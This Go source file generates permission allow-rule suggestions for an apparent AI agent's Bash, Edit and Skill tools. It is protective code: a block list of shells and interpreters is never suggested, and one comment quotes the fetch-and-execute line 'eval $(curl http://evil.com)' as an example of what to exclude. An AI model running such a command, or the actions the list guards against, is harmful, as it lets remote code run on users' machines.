package setting

import (
	"path/filepath"
	"strings"
)

// dangerousPrefixes are bash command prefixes that should never be suggested
// as allow rules because they enable arbitrary code execution.
var dangerousPrefixes = map[string]bool{
	"bash":   true,
	"sh":     true,
	"zsh":    true,
	"fish":   true,
	"eval":   true,
	"source": true,
	".":      true,
	"exec":   true,
	"sudo":   true,
	"env":    true,
	"xargs":  true,
	"ssh":    true,
	"python": true, "python3": true, "python2": true,
	"node": true,
	"deno": true,
	"ruby": true,
	"perl": true,
	"php":  true,
	"lua":  true,
	"npx":  true,
	"bunx": true,
}

// MaxSuggestedRules is the maximum number of suggested rules for compound commands.
const MaxSuggestedRules = 5

// GenerateSuggestions generates smart allow rule suggestions for a tool invocation.
// Returns up to maxSuggestions rules.
func GenerateSuggestions(toolName string, args map[string]any, maxSuggestions int) []string {
	if maxSuggestions <= 0 {
		maxSuggestions = MaxSuggestedRules
	}

	switch toolName {
	case "Bash":
		if cmd, ok := args["command"].(string); ok {
			return suggestBashRules(cmd, maxSuggestions)
		}
	case "Edit", "Write":
		// Edit takes "path", Write "file_path"; filePathArg owns that mapping.
		if fp, ok := filePathArg(toolName, args); ok {
			return suggestFileRules(toolName, fp)
		}
	case "Skill":
		if s, ok := args["skill"].(string); ok {
			return suggestSkillRules(s)
		}
	}

	return nil
}

// suggestBashRules generates prefix-based rules for bash commands.
// For "git commit -m 'fix'", suggests "Bash(git:commit *)".
// For compound commands, generates one suggestion per sub-command.
// Never suggests dangerous prefixes.
func suggestBashRules(cmd string, maxSuggestions int) []string {
	// Try AST-based extraction first
	var subCmds []parsedCommand
	if file := parseBashAST(cmd); file != nil {
		subCmds = extractCommandsAST(file)
	}

	if len(subCmds) > 0 {
		return suggestFromParsedCommands(subCmds, maxSuggestions)
	}

	// Fallback: string-based extraction
	return suggestFromStringCommands(cmd, maxSuggestions)
}

func suggestFromParsedCommands(commands []parsedCommand, max int) []string {
	seen := make(map[string]bool)
	var suggestions []string
	hasMultiple := len(commands) > 1

	for _, cmd := range commands {
		if len(suggestions) >= max {
			break
		}
		// Only suggest rules for commands the user runs directly. One lifted out
		// of a subshell or substitution ($(...)) is an operand of the outer
		// command — suggesting an allow-rule for it would, e.g., propose a curl
		// rule extracted from a dangerous "eval $(curl http://evil.com)".
		if cmd.InSubshell {
			continue
		}
		if hasMultiple && cmd.Name == "cd" {
			continue
		}

		if dangerousPrefixes[cmd.Name] {
			continue
		}

		// Build a 2-token prefix rule: "Bash(git:commit *)"
		var rule string
		if len(cmd.Args) > 0 {
			// Use first arg as subcommand for prefix
			rule = "Bash(" + cmd.Name + ":" + cmd.Args[0] + " *)"
		} else {
			// Single-word command: "Bash(ls:*)"
			rule = "Bash(" + cmd.Name + ":*)"
		}

		if !seen[rule] {
			seen[rule] = true
			suggestions = append(suggestions, rule)
		}
	}

	return suggestions
}

func suggestFromStringCommands(cmd string, max int) []string {
	seen := make(map[string]bool)
	var suggestions []string

	subCmds := extractBashCommands(cmd)
	hasMultiple := len(subCmds) > 1
	for _, sub := range subCmds {
		if len(suggestions) >= max {
			break
		}

		sub = strings.TrimSpace(sub)
		if sub == "" {
			continue
		}

		// Extract first two tokens
		parts := strings.Fields(sub)
		if len(parts) == 0 {
			continue
		}

		name := filepath.Base(parts[0])
		if hasMultiple && name == "cd" {
			continue
		}
		if dangerousPrefixes[name] {
			continue
		}

		var rule string
		if len(parts) > 1 {
			rule = "Bash(" + name + ":" + parts[1] + " *)"
		} else {
			rule = "Bash(" + name + ":*)"
		}

		if !seen[rule] {
			seen[rule] = true
			suggestions = append(suggestions, rule)
		}
	}

	return suggestions
}

// suggestFileRules generates directory-based rules for file tools.
// For Edit("/project/src/main.go"), suggests "Edit(/project/src/*)".
func suggestFileRules(toolName, filePath string) []string {
	dir := filepath.Dir(filePath)
	if dir == "" || dir == "." {
		return nil
	}

	return []string{
		toolName + "(" + dir + "/*)",
	}
}

// suggestSkillRules generates prefix rules for skill invocations.
func suggestSkillRules(skillName string) []string {
	// If skill has a namespace (e.g., "git:commit"), suggest "Skill(git:*)"
	if parts := strings.SplitN(skillName, ":", 2); len(parts) == 2 {
		return []string{"Skill(" + parts[0] + ":*)"}
	}
	return []string{"Skill(" + skillName + ")"}
}
